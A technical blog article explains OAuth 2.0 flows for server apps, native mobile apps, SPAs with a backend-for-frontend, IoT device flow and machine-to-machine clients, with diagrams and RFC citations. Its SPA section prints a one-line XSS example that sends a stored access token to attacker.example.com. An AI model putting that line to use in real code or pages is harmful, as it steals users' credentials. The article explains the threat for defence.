---
author: Anant Agarwal
pubDatetime: 2026-10-22T14:15:00Z
title: "How Does OAuth 2.0 Work? Part 2: Protocol Flows Across Modern Client Runtimes"
featured: true
draft: false
tags:
  - oauth
  - security
  - mobile
  - spa
  - iot
  - how-it-works
description: "A deep dive into OAuth 2.0 execution mechanics across different physical sandboxes: Authorization Code with PKCE, Mobile App Links, the BFF pattern, Device Flow for IoT, and Machine-to-Machine daemons."
---

An authorization protocol cannot treat all execution environments identically. The code executing on a hardened backend server faces radically different physical constraints and threat models than code executing inside a mobile phone operating system, a browser DOM sandbox, or a smart television running an embedded Linux kernel.

In [Part 1](/posts/how-it-works/oauth-1-architecture), we established the core roles, client profiles, and the fundamental distinction between the front channel and the back channel. 

In this article, we trace the internal mechanics of OAuth 2.0 across five concrete runtime environments:
1. Confidential server-side applications
2. Native mobile applications (iOS and Android)
3. Single Page Applications (SPAs) and the Backend for Frontend (BFF) architecture
4. Constrained devices and the Internet of Things (IoT)
5. Headless daemons and machine-to-machine services

## Table of contents

## Server-Side Applications: Authorization Code with PKCE

A traditional web application (written in Java Spring, Go, Python Django, or Node.js) runs on dedicated infrastructure. It is a confidential client: it can hold long-term cryptographic credentials and maintain an isolated in-memory session store.

Historically, confidential clients used the plain **Authorization Code Grant** ([RFC 6749 Section 4.1](https://datatracker.ietf.org/doc/html/rfc6749#section-4.1)). Today, the OAuth 2.0 Security Best Current Practice ([RFC 9700 Section 2.1.1](https://datatracker.ietf.org/doc/html/rfc9700#section-2.1.1)) requires **Proof Key for Code Exchange (PKCE, [RFC 7636](https://datatracker.ietf.org/doc/html/rfc7636))** for all clients, permitting confidential OpenID Connect clients to omit `code_challenge` only if they use the `nonce` parameter in conjunction with client authentication. The upcoming [OAuth 2.1](https://datatracker.ietf.org/doc/draft-ietf-oauth-v2-1/) specification goes even further by requiring PKCE across all clients without exception.

### The Cryptographic Mechanics of PKCE
PKCE binds the authorization request in the front channel directly to the token redemption request in the back channel using a dynamic, single-use cryptographic secret.

```mermaid
flowchart LR
  subgraph clientinit["Client initialization"]
    V["Code verifier<br/>43-128 random chars"]
    C["Code challenge<br/>BASE64URL(SHA256(verifier))"]
  end
  subgraph asval["Authorization server validation"]
    S["Stored challenge"]
    M["Compute SHA256(received_verifier)<br/>Assert matches stored challenge"]
  end
  V -->|SHA-256 hash| C
  C -->|Front channel| S
  V -->|Back channel| M
  S <--> M
  classDef control stroke-width:2px;
  classDef data stroke-width:2px;
  class M control;
  class V,C data;
```

1. **Code Verifier generation.** The client runtime generates a cryptographically random high-entropy string `V` using a secure pseudo-random number generator (CSPRNG):
   - Length: `43 <= len(V) <= 128`
   - Allowed characters: `[A-Z]`, `[a-z]`, `[0-9]`, `-`, `.`, `_`, `~` (unreserved URI characters)
2. **Code Challenge derivation.** The client computes the SHA-256 digest of the verifier and encodes it using URL-safe Base64 without padding:
   ```text
   C = BASE64URL(SHA-256(V))
   ```
3. **Challenge registration.** The client dispatches the user to the Authorization Server over the front channel, sending `C` and the transformation method `code_challenge_method=S256`. The Authorization Server stores `C` alongside the issued authorization code.
4. **Verifier redemption.** When the client redeems the authorization code over the secure back channel, it provides the plaintext verifier `V`. The Authorization Server computes `BASE64URL(SHA-256(V))` and compares it to the stored challenge. If the digests match, it issues the tokens.

PKCE provides two protections:

- **Code interception.** Even if an attacker intercepts the authorization code in the front channel, the code is useless without the plaintext verifier `V`, which never traversed the front channel.
- **Code injection.** An attacker who obtains a code from *their own* session cannot inject it into a victim's callback, because the victim's client will redeem it with the victim's verifier, which will not match. This is why PKCE matters even for confidential clients that also hold a `client_secret`: the secret proves *which app* is redeeming the code, but not *which session* the code belongs to.

```mermaid
sequenceDiagram
  autonumber
  actor User as Resource Owner
  participant UA as Browser
  participant App as Backend Server
  participant AS as Authorization Server
  participant RS as Resource Server

  User->>UA: Click Login
  UA->>App: GET /auth/login
  Note over App: Generates Verifier (V) and Challenge (C)
  App-->>UA: 302 Redirect to AS with C and State
  UA->>AS: GET /authorize?code_challenge=C&...
  AS->>UA: Present login & consent screen
  User->>UA: Authenticate and grant consent
  UA->>AS: POST credentials
  AS-->>UA: 302 /callback?code=AUTH_CODE&state=...
  UA->>App: GET /callback?code=AUTH_CODE&state=...
  Note over App: Validates State parameter
  App->>AS: POST /token (code, verifier V, redirect_uri, client credentials)
  Note over AS: Asserts SHA256(V) == C
  AS-->>App: 200 OK (access_token, refresh_token)
  App-->>UA: Set HttpOnly encrypted session cookie
  UA->>App: GET /dashboard (with session cookie)
  App->>RS: GET /api/data with Bearer Access Token
  RS-->>App: Return protected data
```

## Native Mobile Applications (iOS and Android)

Native applications executing on consumer mobile devices introduce unique security hazards that break standard web assumptions.

### The Native App Dilemma: Secrets Cannot Be Maintained
A mobile binary compiled for iOS or Android is a public client. It is distributed across millions of untrusted devices. If an engineering team embeds a `client_secret` in a mobile app, an attacker can extract it effortlessly:
- On Android, running `apktool d app.apk` decompiles the package into readable Smali and resource files. Hardcoded strings, API keys, and configuration files are exposed immediately.
- On iOS, attackers run class-dump, inspect binary strings via `strings MyApp.app/MyApp`, or attach dynamic instrumentation tools like Frida and LLDB to read secrets from memory at runtime.

Therefore, native apps must register with the Authorization Server as **public clients without a client secret**, using PKCE exclusively to secure code exchange.

### Redirect URLs: Custom URI Schemes vs Universal Links
When the Authorization Server completes authentication in the system browser, it must deliver the authorization code back to the mobile app. The mechanism used to route this redirect determines system vulnerability to code interception.

```mermaid
flowchart TB
  subgraph custom["Custom URI scheme: myapp://callback"]
    UA1["System browser"]
    OS1["Operating system package manager"]
    APP1["Legitimate app"]
    ROG1["Malicious rogue app<br/>Registers same scheme"]
    UA1 --> OS1
    OS1 -.->|Unpredictable routing| ROG1
    OS1 -.->|Unpredictable routing| APP1
  end
  subgraph modern["Universal links / App links"]
    UA2["System browser"]
    OS2["OS verifies domain proof<br/>assetlinks.json / apple-app-site-association"]
    APP2["Verified app exclusively"]
    UA2 --> OS2
    OS2 ==>|Deterministic dispatch| APP2
  end
  classDef control stroke-width:2px;
  classDef bad stroke-width:2px;
  class OS2 control;
  class ROG1 bad;
```

#### 1. Custom URI Schemes (`com.example.app://oauth/callback`)
Early mobile architectures defined custom operating system schemes. In Android's `AndroidManifest.xml` or iOS's `Info.plist`, an app registers an intent filter or URL scheme.

The architectural flaw: **operating systems do not enforce uniqueness on custom URI schemes.** Any malicious application installed on the same device can register the exact same scheme (`com.example.app://`). When the browser redirects to that URL, the mobile operating system faces an ambiguous routing decision. On Android, it may display an intent disambiguation dialog, or worse, route the intent containing the authorization code to the malicious app. On iOS, which app receives the URL is undefined.

This is precisely the attack PKCE was designed to defeat: the rogue app receives the code but not the verifier, so it cannot redeem it. [RFC 8252 Section 7.1](https://datatracker.ietf.org/doc/html/rfc8252#section-7.1) therefore still permits private-use URI schemes, provided they use reverse-domain names (e.g. `com.example.app:/oauth/callback`) and the client uses PKCE. Claimed HTTPS URLs remain the stronger option.

#### 2. Claimed HTTPS URLs (Universal Links and Android App Links)
Modern native OAuth implementations conforming to [RFC 8252 (OAuth 2.0 for Native Apps)](https://datatracker.ietf.org/doc/html/rfc8252) use standard HTTPS redirect URLs (`https://app.example.com/oauth/callback`) backed by cryptographic domain verification:
- **iOS Universal Links:** The domain hosts a JSON file at `https://app.example.com/.well-known/apple-app-site-association` (served over HTTPS; signing is no longer required). The file lists the authorized Apple Team ID and Bundle Identifier.
- **Android App Links:** Android requires `https://app.example.com/.well-known/assetlinks.json`, which contains the SHA-256 fingerprint of the app's signing certificate.

The platform verifies the association before routing links to the app. Since iOS 14, Apple's CDN fetches and caches the association file rather than each device contacting your domain directly. Android verifies `assetlinks.json` at install or update time (with behavior refined in Android 12). In both cases, an app that is not listed by the domain owner cannot claim `https://app.example.com/` URLs, so redirects are bound to the legitimate binary.

#### 3. Loopback Redirects (Desktop and CLI Apps)
For desktop applications and command-line tools, [RFC 8252 Section 7.3](https://datatracker.ietf.org/doc/html/rfc8252#section-7.3) defines loopback redirects such as `http://127.0.0.1:{port}/callback`. The app opens a temporary local listener on an ephemeral port, and the AS must allow any port for registered loopback redirect URIs. RFC 8252 recommends the literal loopback IP (`127.0.0.1` or `[::1]`) rather than `localhost`, which can be resolved to an unexpected interface or intercepted by host-file and firewall configuration.

### Browser Security: WebViews vs System Browser Contexts
A major failure mode in legacy mobile apps was rendering the login screen inside an embedded **in-app WebView** (such as Android's `android.webkit.WebView` or iOS's `WKWebView`).

```mermaid
flowchart LR
  subgraph webview["In-app webview (insecure)"]
    AV["Host mobile app<br/>Direct memory access"]
    WV["Embedded webview<br/>Renders login screen"]
    AV -->|Keylog input, sniff cookies<br/>DOM injection via evaluateJavascript| WV
  end
  subgraph sysbrowser["Secure browser API (RFC 8252 compliant)"]
    MA["Host mobile app"]
    SBC["ASWebAuthenticationSession / Custom Tabs<br/>Isolated process boundary"]
    MA -.->|Zero DOM / memory access| SBC
  end
  classDef control stroke-width:2px;
  classDef bad stroke-width:2px;
  class SBC control;
  class AV bad;
```

Embedded WebViews introduce critical vulnerabilities:
1. **Password sniffing and keylogging.** The host mobile application controls the outer window. It can inject arbitrary JavaScript into the WebView via `evaluateJavascript()`, attach touch event listeners to capture keystrokes, and read entered passwords and MFA tokens directly.
2. **Cookie isolation failure.** WebViews operate in an isolated sandbox separate from the user's primary mobile browser. The user cannot benefit from existing Single Sign-On (SSO) sessions in Safari or Chrome; they must re-enter their credentials every time.
3. **Credential phishing.** The embedded WebView cannot display a trusted browser URL bar. The user has no way to verify the SSL certificate, domain name, or identity of the authorization server.

[RFC 8252 Section 8.12](https://datatracker.ietf.org/doc/html/rfc8252#section-8.12) states that native apps **MUST NOT** use embedded user agents for authorization requests. Native apps must use **in-app system browser contexts**:
- **iOS:** `ASWebAuthenticationSession`
- **Android:** `Custom Tabs`

These APIs launch an out-of-process browser window hosted by the operating system. The host mobile application cannot inspect the memory, read the DOM, or touch the cookies of the system browser. `ASWebAuthenticationSession` shares cookies with Safari (unless `prefersEphemeralWebBrowserSession` is set), and Custom Tabs share cookies with the user's default browser (Chrome on most devices, or any other browser that supports Custom Tabs), so a user who is already signed in gets SSO with a single tap.

> **Note:** `SFSafariViewController` has not shared cookies with Safari since iOS 11, so it no longer provides SSO and should not be used for OAuth.

Two platform caveats apply to HTTPS redirects. `ASWebAuthenticationSession` has only supported HTTPS callback URLs since iOS 17.4 (earlier versions required a custom scheme). On Android, Chrome may not dispatch an App Link triggered by a server-side redirect without a user gesture, so test this path carefully.

### Native App Execution Flow Step-by-Step

```mermaid
sequenceDiagram
  autonumber
  actor User as Mobile User
  participant App as Native Mobile App
  participant OS as Mobile OS (iOS/Android)
  participant Tab as Chrome Custom Tab / ASWebAuth
  participant AS as Authorization Server
  participant RS as Resource Server

  User->>App: Tap "Sign In"
  Note over App: 1. Generates PKCE Verifier & Challenge (C)<br/>2. Generates State (and Nonce, if using OIDC)
  App->>OS: Launch browser intent with Auth URL
  OS->>Tab: Open isolated browser tab
  Tab->>AS: GET /authorize?client_id=mob-123&code_challenge=C&...
  Note over AS: Presents login & biometrics / MFA
  User->>Tab: Authenticate
  AS-->>Tab: 302 Redirect to https://app.example.com/oauth/callback?code=AC
  Tab->>OS: Intercepts claimed HTTPS URL
  OS->>App: Deliver redirect intent containing Auth Code
  Note over App: 3. Closes browser tab
  App->>AS: POST /token (client_id, code, code_verifier, redirect_uri)
  Note over AS: Asserts SHA256(code_verifier) == C
  AS-->>App: 200 OK (access_token, refresh_token)
  Note over App: 4. Stores refresh_token in Keychain / KeyStore-encrypted storage
  App->>RS: GET /api/data with Bearer Access Token
  RS-->>App: 200 OK Protected Data
```

### Refresh Token Security on Native Devices
Because native apps cannot maintain client secrets, issuing a long-lived refresh token to a public client presents risk. If the device is compromised or backup images are inspected, the refresh token could be extracted.

To secure refresh tokens on mobile platforms:
1. **Hardware-backed storage.** Hardware security modules on phones protect *keys*, not arbitrary data, so tokens are stored using platform facilities built on top of them:
   - **iOS:** Store the refresh token as a **Keychain** item. Keychain data is encrypted with hardware-protected keys, and a `SecAccessControl` policy can require biometric authentication (Touch ID / Face ID) or the device passcode before the item can be read. (The Secure Enclave itself stores only P-256 private keys.)
   - **Android:** Generate an AES key in the **Android KeyStore** (backed by the Trusted Execution Environment or StrongBox), use it to encrypt the refresh token, and store the ciphertext in app-private storage. The key never leaves secure hardware.
2. **Sender-constraining or rotation ([RFC 9700 Section 4.14](https://datatracker.ietf.org/doc/html/rfc9700#section-4.14)).** The Security BCP requires refresh tokens issued to public clients to be either **sender-constrained** (bound to a key the client holds, via DPoP ([RFC 9449](https://datatracker.ietf.org/doc/html/rfc9449)) or mTLS) or **rotated**. With rotation, every time the app presents a refresh token, the server invalidates it and issues a brand-new one alongside the new access token. If an old refresh token is reused, the Authorization Server detects the replay and invalidates the entire token family. ([RFC 6749 Section 6](https://datatracker.ietf.org/doc/html/rfc6749#section-6) only says the server *MAY* issue a new refresh token; rotation with reuse detection comes from RFC 9700 and OAuth 2.1.)

## Single Page Applications (SPAs) and Browser Sandboxes

Single Page Applications (React, Vue, Angular, Svelte) execute entirely within the browser's JavaScript virtual machine. 

### The Browser Runtime Sandbox: Zero Secure Storage
A browser provides three client-side storage mechanisms accessible to JavaScript:
1. `localStorage`
2. `sessionStorage`
3. `IndexedDB`

None of these storage engines provide cryptographic isolation or access control boundaries against scripts executing within the same origin. 

If an application stores an OAuth access token or refresh token in `localStorage`, **any Cross-Site Scripting (XSS) vulnerability compromises all tokens permanently.** A single vulnerability in an npm dependency, a rogue CDN-hosted script, or an unescaped input parameter allows an attacker to execute:

```javascript
// Exfiltrate all stored tokens instantly
fetch("https://attacker.example.com/log?t=" + encodeURIComponent(localStorage.getItem("access_token")));
```

Furthermore, `localStorage` has no expiration mechanism; tokens persist until manually cleared or overwritten.

### Binding the Response to the Request
In browser-based OAuth, an attacker's goal is often to make the client accept an authorization response (a code or an ID token) that belongs to a different session. Three controls bind each response to the request that started it, and each defends against a different attack:

1. **The `state` parameter ([RFC 6749 Section 10.12](https://datatracker.ietf.org/doc/html/rfc6749#section-10.12)): defends against CSRF.** The client generates a cryptographically random string and stores it somewhere that survives the full-page redirect (`sessionStorage` or a cookie, not in-memory JavaScript variables), then passes it in the authorization request. When the Authorization Server redirects back with the authorization code, it echoes the exact `state` value. The client asserts that the returned state matches the stored value before proceeding.
2. **The `nonce` parameter ([OpenID Connect Core 1.0 Section 3.1.2.1](https://openid.net/specs/openid-connect-core-1_0.html#AuthRequest)): defends against ID token injection and replay.** The client generates a random nonce, sends it in the authorization request, and verifies that the returned ID token contains the identical `nonce` claim. (A common implementation pattern stores a random value in a cookie and sends its hash as the nonce, but hashing is not part of the protocol.)
3. **PKCE: defends against code interception and injection.** Authorization codes are single-use, and each flow uses a fresh `code_verifier`. Even if a code is intercepted or injected, it cannot be exchanged for tokens without the verifier generated for that specific request.

### The Modern Gold Standard: The Backend for Frontend (BFF) Pattern
Because pure browser environments are fundamentally inhospitable to secure token persistence, the IETF draft on *OAuth 2.0 for Browser-Based Applications* describes three architectural patterns: a **Backend for Frontend (BFF)**, a token-mediating backend, and a browser-only OAuth client. It identifies the BFF as the most secure of the three.

Instead of allowing the SPA to act as a public client and handle tokens directly, a lightweight server-side reverse proxy (the BFF) acts as a **confidential client** on behalf of the SPA.

```mermaid
flowchart LR
  subgraph browser["User browser sandbox"]
    SPA["React / Vue SPA"]
  end
  subgraph edge["Secure backend domain"]
    BFF["BFF proxy<br/>Confidential client"]
  end
  subgraph identity["Identity and API infrastructure"]
    AS["Authorization server"]
    RS["Resource server / API"]
  end
  SPA <-->|Encrypted SameSite HttpOnly cookie<br/>No token in browser memory| BFF
  BFF <-->|Back channel TLS with client_secret| AS
  BFF ==>|Bearer access token| RS
  classDef control stroke-width:2px;
  classDef data stroke-width:2px;
  class BFF control;
  class AS,RS data;
```

#### How the BFF Pattern Operates:
1. **The BFF executes the flow.** The BFF holds the `client_id` and `client_secret` (or private key). It initiates the Authorization Code + PKCE flow.
2. **Tokens stay on the server.** When the authorization code is exchanged, the access token and refresh token are delivered to the BFF. **They are never sent to the browser.** The BFF stores them in a secure server-side cache (e.g., Redis) or encrypts them directly.
3. **Browser gets an HttpOnly cookie.** The BFF issues an encrypted session cookie to the browser configured with defensive attributes:
   - `HttpOnly`: Prevents client-side JavaScript (and XSS payloads) from reading the cookie.
   - `Secure`: Ensures the cookie is only transmitted over TLS.
   - `SameSite=Strict` (or `Lax`): Restricts when the browser attaches the cookie to cross-site requests, mitigating CSRF. Note that `Lax` still sends the cookie on cross-site top-level `GET` navigations, and "same-site" is broader than "same-origin" (sibling subdomains count as the same site).
   - `__Host-` name prefix: Forces `Secure`, `Path=/`, and no `Domain` attribute, locking the cookie to the exact BFF host.

   Because `SameSite` alone is not a complete CSRF defense, state-changing BFF endpoints should also require a custom request header (e.g. `X-Requested-With`) or an anti-CSRF token.
4. **Transparent proxying.** When the SPA makes an API request to `/api/orders`, it calls the BFF with the session cookie. The BFF decrypts the session, extracts the real OAuth access token, attaches it as an `Authorization: Bearer <token>` header, and proxies the call to the Resource Server.

By adopting the BFF pattern, the browser is completely removed from the bearer token lifecycle. Be precise about what this buys you: the BFF **prevents token theft**, but it does **not** neutralize XSS. Malicious script running in the page can still send requests through the BFF using the user's session ("session riding") for as long as the page is open. It simply cannot steal long-lived credentials to use elsewhere.

## Constrained Devices and IoT: The Device Authorization Grant

Internet of Things (IoT) appliances, smart televisions, set-top boxes, and Command Line Interface (CLI) developer tools face physical input constraints. They typically lack a fully functional web browser, have no QWERTY keyboard, or operate over high-latency networks.

[RFC 8628 (OAuth 2.0 Device Authorization Grant)](https://datatracker.ietf.org/doc/html/rfc8628) was engineered specifically for this topology. It decouples the device requesting authorization from the device where the user authenticates.

```mermaid
sequenceDiagram
  autonumber
  actor User as End User
  participant Dev as IoT Device / Smart TV
  participant AS as Authorization Server
  participant Phone as User Smartphone / Browser

  User->>Dev: Launches App on Smart TV
  Dev->>AS: POST /device/code (client_id, scope)
  AS-->>Dev: 200 OK (device_code, user_code, verification_uri, interval=5)
  Dev->>User: Displays: "Visit https://auth.example.com/device<br/>Enter code: WDJB-MJHT"
  
  par User authenticates on secondary device
    User->>Phone: Navigates to verification_uri
    Phone->>AS: GET /device
    AS->>Phone: Prompt for user_code and credentials
    User->>Phone: Enters "WDJB-MJHT" & authenticates
    AS->>Phone: Consent confirmed
  and Device polls authorization server
    loop Every 5 seconds (interval)
      Dev->>AS: POST /token (grant_type=device_code, device_code)
      AS-->>Dev: 400 Bad Request (error: authorization_pending)
    end
  end

  Dev->>AS: POST /token (grant_type=device_code, device_code)
  AS-->>Dev: 200 OK (access_token, refresh_token)
  Note over Dev: Authenticated successfully
```

### The Conversational Mechanics of RFC 8628

1. **Device initiates request.** The device sends a POST request to the Authorization Server's device authorization endpoint:
   ```http
   POST /device/code HTTP/1.1
   Host: auth.example.com
   Content-Type: application/x-www-form-urlencoded

   client_id=smart-tv-9021&scope=stream:video
   ```

2. **Server generates two distinct codes.** The server creates:
   - A **Device Verification Code (`device_code`)**: A high-entropy, long string used internally by the device to poll the server.
   - An **End-User Verification Code (`user_code`)**: A short, human-friendly code with characters chosen to avoid visual ambiguity. [RFC 8628 Section 6.1](https://datatracker.ietf.org/doc/html/rfc8628#section-6.1) suggests 8 characters drawn from the base-20 consonant set `BCDFGHJKLMNPQRSTVWXZ` (e.g. `WDJB-MJHT`), which is easy to type and avoids accidentally spelling words.
   
   The server responds with:
   ```json
   {
     "device_code": "GmRhmhcxhwAzkoEqiMEg_DnyEysN",
     "user_code": "WDJB-MJHT",
     "verification_uri": "https://auth.example.com/device",
     "verification_uri_complete": "https://auth.example.com/device?user_code=WDJB-MJHT",
     "expires_in": 900,
     "interval": 5
   }
   ```

3. **Device prompts the user.** The device renders instructions on screen (or prints a QR code encoding `verification_uri_complete`): *"On your computer or smartphone, go to https://auth.example.com/device and enter code WDJB-MJHT"*.

4. **Device enters polling loop.** While the user picks up their smartphone and navigates to the URL, the device begins polling the token endpoint:
   ```http
   POST /token HTTP/1.1
   Host: auth.example.com
   Content-Type: application/x-www-form-urlencoded

   grant_type=urn:ietf:params:oauth:grant-type:device_code
   &device_code=GmRhmhcxhwAzkoEqiMEg_DnyEysN
   &client_id=smart-tv-9021
   ```

5. **Rate-limiting and polling control.** The Authorization Server responds with:
   - `{"error": "authorization_pending"}` if the user has not finished logging in.
   - `{"error": "slow_down"}` if the device polls faster than the required `interval` (5 seconds). The device must increase its polling interval by 5 seconds for this and all subsequent requests.
   - `{"error": "access_denied"}` if the user declined the authorization request.
   - `{"error": "expired_token"}` if the 900-second window elapses without user action.

6. **Token Issuance.** The instant the user completes authentication and consent on their phone, the authorization server marks the `device_code` as authorized. On the subsequent poll from the TV, the server responds with HTTP 200 containing the access token and refresh token.

### Device Flow Phishing
The decoupled design of the Device Flow creates a well-known abuse vector ([RFC 8628 Section 5.4](https://datatracker.ietf.org/doc/html/rfc8628#section-5.4)). An attacker starts a device flow themselves, then sends the victim a convincing message ("Enter code WDJB-MJHT at https://auth.example.com/device to verify your account"). If the victim complies, the attacker's device receives tokens for the victim's account. Authorization servers mitigate this by clearly showing which application and device the user is authorizing, keeping `user_code` lifetimes short, and warning users never to enter codes they did not personally request.

## Machine-to-Machine Applications: Client Credentials Grant

Not all software involves a human user sitting at a keyboard. Background cron jobs, batch data pipelines, billing workers, and internal microservices need to call other internal APIs autonomously.

When there is no Resource Owner and no browser, the Authorization Code flow does not apply. This topology uses the **Client Credentials Grant** ([RFC 6749 Section 4.4](https://datatracker.ietf.org/doc/html/rfc6749#section-4.4)).

```mermaid
sequenceDiagram
  autonumber
  participant Daemon as Batch Processing Service
  participant AS as Authorization Server
  participant RS as Invoicing API

  Note over Daemon: 1. Needs to process nightly invoices
  Daemon->>AS: POST /oauth/token<br/>grant_type=client_credentials<br/>client_id=batch-svc&client_secret=SEC...<br/>scope=invoices:process
  Note over AS: 2. Authenticates client credentials<br/>3. Verifies client is registered for scope
  AS-->>Daemon: 200 OK (access_token, expires_in=3600)
  Note over Daemon: 4. Caches access_token in local memory
  Daemon->>RS: POST /invoices/batch with Bearer Access Token
  RS-->>Daemon: 200 OK Processed
```

### Protocol Mechanics
In the Client Credentials flow, the client acts on its own behalf, accessing either its own resources or resources whose access was arranged with the Authorization Server in advance ([RFC 6749 Section 4.4](https://datatracker.ietf.org/doc/html/rfc6749#section-4.4)). No user is involved; it authenticates solely on its own authority.

1. **Client Registration.** The daemon application is registered on the Authorization Server with an assigned `client_id` and a strong authentication credential (a high-entropy secret, a public X.509 certificate for mTLS, or a private key JWT).
2. **Direct Token Request.** The client makes a direct back-channel POST request:
   ```http
   POST /oauth/token HTTP/1.1
   Host: auth.example.com
   Authorization: Basic YmF0Y2gtc3ZjOnN1cGVyLXNlY3JldC1rZXk=
   Content-Type: application/x-www-form-urlencoded

   grant_type=client_credentials&scope=invoices:process
   ```
   Per [RFC 6749 Section 2.3.1](https://datatracker.ietf.org/doc/html/rfc6749#section-2.3.1), the client ID and secret must each be form-urlencoded *before* being joined with `:` and base64-encoded, which is a common source of interoperability bugs with secrets containing special characters. For production M2M workloads, prefer `private_key_jwt` ([RFC 7523](https://datatracker.ietf.org/doc/html/rfc7523)) or mTLS ([RFC 8705](https://datatracker.ietf.org/doc/html/rfc8705)) over shared secrets.
3. **Access Token Response.** The Authorization Server verifies the credentials and returns an access token:
   ```json
   {
     "access_token": "eyJhbGciOiJSUzI1NiIs...",
     "token_type": "Bearer",
     "expires_in": 3600,
     "scope": "invoices:process"
   }
   ```

### Critical Invariants of the Client Credentials Flow
- **No Refresh Tokens are issued.** [RFC 6749 Section 4.4.3](https://datatracker.ietf.org/doc/html/rfc6749#section-4.4.3) explicitly dictates that refresh tokens should not be included in the response. A daemon possesses its own root credentials. If its access token expires, it simply calls `/oauth/token` again with its client credentials to mint a new access token. Issuing a refresh token would add stateful overhead with zero security benefit.
- **In-memory token caching.** Machine-to-machine clients must cache access tokens in memory and refresh them shortly *before* expiration (e.g. when less than 60 seconds of `expires_in` remain) to absorb clock skew and in-flight latency. Querying the Authorization Server on every single microservice call introduces unnecessary latency and degrades the central identity cluster.

## Renewing Access: The Refresh Token Grant

Every user-facing runtime above eventually needs a fresh access token without sending the user back through the browser. That is the job of the **Refresh Token Grant** ([RFC 6749 Section 6](https://datatracker.ietf.org/doc/html/rfc6749#section-6)), a direct back-channel call to the token endpoint:

```http
POST /token HTTP/1.1
Host: auth.example.com
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token
&refresh_token=tGzv3JOkF0XG5Qx2TlKWIA
&client_id=mob-123
&scope=read%3Aorders
```

Confidential clients also authenticate (client secret, `private_key_jwt`, or mTLS); public clients send only `client_id`. The optional `scope` may narrow, but never broaden, the originally granted scope. The response mirrors the original token response:

```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 900,
  "refresh_token": "8xLOxBtZp8",
  "scope": "read:orders"
}
```

If a new `refresh_token` is returned (rotation), the client must replace the old one atomically; reusing the old value will typically revoke the whole token family. An `invalid_grant` error means the refresh token is expired, revoked, or already used, and the client must restart the authorization flow.

## A Note on the Password Grant

RFC 6749 also defines the **Resource Owner Password Credentials** grant ([Section 4.3](https://datatracker.ietf.org/doc/html/rfc6749#section-4.3)), in which the client collects the user's username and password and posts them to the token endpoint. It reintroduces exactly the credential-sharing problem from Part 1 and cannot support MFA, federation, or phishing-resistant login. [RFC 9700 Section 2.4](https://datatracker.ietf.org/doc/html/rfc9700#section-2.4) states it **MUST NOT** be used, and OAuth 2.1 removes it. Migrate any remaining uses to Authorization Code with PKCE (or Device Flow for input-constrained devices).

## Hardening Checklist for Every Flow

Regardless of runtime, the Security BCP ([RFC 9700](https://datatracker.ietf.org/doc/html/rfc9700)) adds several controls on top of the flows above:

- **Exact redirect URI matching.** The AS must compare `redirect_uri` against pre-registered values by exact string match (loopback ports excepted). Wildcards and prefix matching have caused numerous real-world token leaks.
- **Issuer identification ([RFC 9207](https://datatracker.ietf.org/doc/html/rfc9207)).** The AS returns an `iss` parameter in the authorization response, and clients that talk to multiple authorization servers verify it to defeat mix-up attacks.
- **Pushed Authorization Requests ([RFC 9126](https://datatracker.ietf.org/doc/html/rfc9126)).** The client POSTs the authorization parameters to the AS over the back channel and receives a short-lived `request_uri`. The front-channel redirect then carries only that reference, so parameters cannot be tampered with or leaked in URLs.
- **Sender-constrained tokens.** Bind access and refresh tokens to a client-held key using DPoP ([RFC 9449](https://datatracker.ietf.org/doc/html/rfc9449)) or mTLS ([RFC 8705](https://datatracker.ietf.org/doc/html/rfc8705)), so a stolen token cannot be used on its own. Part 3 covers this in detail.

## Summary: Comparing the Runtimes

| Dimension | Confidential Web App | Native Mobile App | SPA with BFF | IoT / Smart TV | M2M / Daemon |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Grant Type** | Auth Code + PKCE | Auth Code + PKCE | Auth Code + PKCE | Device Flow (RFC 8628) | Client Credentials |
| **Client Type** | Confidential | Public | Confidential (at BFF) | Public | Confidential |
| **User Present?** | Yes | Yes | Yes | Yes (on 2nd device) | No |
| **Browser Context** | User's browser | ASWebAuthenticationSession / Custom Tab | User's browser (same origin as BFF) | Secondary Device | None |
| **Token Storage** | Server memory/Redis | Keychain / KeyStore-encrypted storage | Server memory/Redis | Encrypted or secure-element storage | In-memory cache |
| **Refresh Tokens** | Yes | Yes (with rotation) | Yes (held by BFF) | Yes | No |

The SPA column assumes the BFF pattern. A browser-only SPA can still run Authorization Code + PKCE directly as a public client, but then tokens live in JavaScript-accessible memory, and refresh tokens must be rotated or DPoP-bound. Treat that option as a fallback when a backend is genuinely unavailable.

Having explored how authorization codes and bearer tokens are acquired across diverse operating environments, the next question is architectural: *What actually happens when a Resource Server receives an access token?*

In **[Part 3](/posts/how-it-works/oauth-3-tokens-and-validation)**, we dissect the data plane: comparing reference tokens to self-encoded JSON Web Tokens (JWTs), examining remote token introspection versus local JWKS cryptographic verification, executing step-up authentication challenges ([RFC 9470](https://datatracker.ietf.org/doc/html/rfc9470)), designing API gateway offloading architectures, and solving the distributed revocation problem.
